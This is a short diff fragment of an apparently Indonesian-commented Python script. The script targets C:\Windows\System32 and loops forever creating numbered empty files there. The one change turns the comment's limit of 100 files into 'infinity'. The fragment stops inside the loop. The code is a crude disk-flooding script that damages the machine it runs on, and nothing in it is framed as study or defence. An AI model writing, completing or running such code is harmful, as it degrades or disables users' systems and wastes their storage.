@@ -6,7 +6,7 @@ direktori = "C:\Windows\System32"
 if not os.path.exists(direktori):
     os.makedirs(direktori)
 
-# Membuat file kosong dengan nama yang berbeda-beda hingga 100 kali
+# Membuat file kosong dengan nama yang berbeda-beda hingga tak terhingga
 i = 1
 while True:
     nama_file = f"{direktori}/file_{i}.txt"
